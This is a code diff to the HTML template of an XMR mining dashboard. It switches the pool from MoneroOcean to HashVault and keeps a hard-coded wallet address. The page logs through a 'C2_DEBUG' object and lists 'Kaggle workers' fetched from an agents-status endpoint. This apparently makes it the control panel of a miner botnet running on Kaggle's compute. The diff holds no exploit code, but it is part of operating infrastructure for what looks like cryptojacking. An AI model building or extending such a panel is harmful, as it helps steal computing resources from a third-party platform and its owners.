@@ -1,6 +1,6 @@
 {% extends "base.html" %}
-{% block title %}MoneroOcean Pool{% endblock %}
-{% block page_title %}MoneroOcean Mining{% endblock %}
+{% block title %}HashVault Pool{% endblock %}
+{% block page_title %}HashVault Mining{% endblock %}
 {% block page_subtitle %}XMR Pool Dashboard{% endblock %}
 
 {% block head %}
@@ -325,11 +325,11 @@
 
 {% block scripts %}
 <script>
-    C2_DEBUG.initPage('moneroocean');
+    C2_DEBUG.initPage('hashvault');
     
     const WALLET = '44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5';
-    const POOL_URL = 'https://moneroocean.stream';
-    const POOL_API = 'https://api.moneroocean.stream';
+    const POOL_URL = 'https://hashvault.pro';
+    const POOL_API = 'https://hashvault.pro/api';
 
     function switchTab(tab) {
         try {
@@ -344,17 +344,17 @@
             if (tab === 'dashboard') {
                 const iframe = document.getElementById('pool-iframe');
                 if (iframe && !iframe.src) {
-                    iframe.src = `${POOL_URL}/#/dashboard`;
+                    iframe.src = `${POOL_URL}/en?user=${WALLET}`;
                 }
             }
-            C2_DEBUG.debug('MoneroOcean', 'Switched to tab: ' + tab);
+            C2_DEBUG.debug('HashVault', 'Switched to tab: ' + tab);
         } catch (err) {
-            C2_DEBUG.error('MoneroOcean', 'Error switching tab', err);
+            C2_DEBUG.error('HashVault', 'Error switching tab', err);
         }
     }
 
     async function fetchPoolStats() {
-        C2_DEBUG.debug('MoneroOcean', 'Fetching pool stats...');
+        C2_DEBUG.debug('HashVault', 'Fetching pool stats...');
         try {
             const response = await fetch(`${POOL_API}/miner/${WALLET}/stats`);
             if (!response.ok) throw new Error('API returned ' + response.status);
@@ -390,16 +390,16 @@
                     tbody.appendChild(row);
                 });
             }
-            C2_DEBUG.success('MoneroOcean', 'Pool stats loaded: ' + workerCount + ' workers');
+            C2_DEBUG.success('HashVault', 'Pool stats loaded: ' + workerCount + ' workers');
         } catch (error) {
-            C2_DEBUG.error('MoneroOcean', 'Error fetching pool stats', error);
+            C2_DEBUG.error('HashVault', 'Error fetching pool stats', error);
             document.getElementById('workers-tbody').innerHTML = 
                 '<tr><td colspan="5"><div class="empty-state"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg><p>Error loading data</p></div></td></tr>';
         }
     }
 
     async function fetchKaggleWorkers() {
-        C2_DEBUG.debug('MoneroOcean', 'Fetching Kaggle workers...');
+        C2_DEBUG.debug('HashVault', 'Fetching Kaggle workers...');
         try {
             const response = await fetch('/api/kaggle/agents/status');
             if (!response.ok) throw new Error('API returned ' + response.status);
@@ -430,9 +430,9 @@
                     tbody.appendChild(row);
                 });
             }
-            C2_DEBUG.success('MoneroOcean', 'Kaggle workers loaded: ' + count);
+            C2_DEBUG.success('HashVault', 'Kaggle workers loaded: ' + count);
         } catch (error) {
-            C2_DEBUG.error('MoneroOcean', 'Error fetching Kaggle workers', error);
+            C2_DEBUG.error('HashVault', 'Error fetching Kaggle workers', error);
         }
     }
 
@@ -450,7 +450,7 @@
         fetchPoolStats();
         fetchKaggleWorkers();
         showNotification('Pool stats refreshed', 'green');
-        C2_DEBUG.info('MoneroOcean', 'Stats refreshed manually');
+        C2_DEBUG.info('HashVault', 'Stats refreshed manually');
     }
 
     // Initial load
